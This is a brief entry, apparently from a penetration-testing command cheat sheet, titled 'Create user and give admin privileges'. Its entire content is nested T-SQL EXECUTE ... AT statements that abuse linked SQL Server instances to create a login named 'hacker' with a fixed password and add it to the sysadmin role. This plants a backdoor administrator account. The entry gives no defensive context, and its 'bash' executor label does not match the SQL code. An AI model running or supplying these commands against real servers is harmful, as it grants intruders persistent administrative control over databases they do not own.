---
id: eb2f529e-4ecc-46a2-82bd-03083d59f4d6
name: Create user and give admin privileges
type: command
executor: bash
data: 'EXECUTE(''EXECUTE(''''CREATE LOGIN hacker WITH PASSWORD = ''''''''P@ssword123.''''''''
  '''') AT "DOMINIO\SERVER1"'') AT "DOMINIO\SERVER2"

  EXECUTE(''EXECUTE(''''sp_addsrvrolemember ''''''''hacker'''''''' , ''''''''sysadmin''''''''
  '''') AT "DOMINIO\SERVER1"'') AT "DOMINIO\SERVER2"'
output: null
created_at: '2023-04-06T03:56:34.105426+00:00'
updated_at: '2023-04-10T20:22:42.442119+00:00'
---

# Create user and give admin privileges

```bash
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```


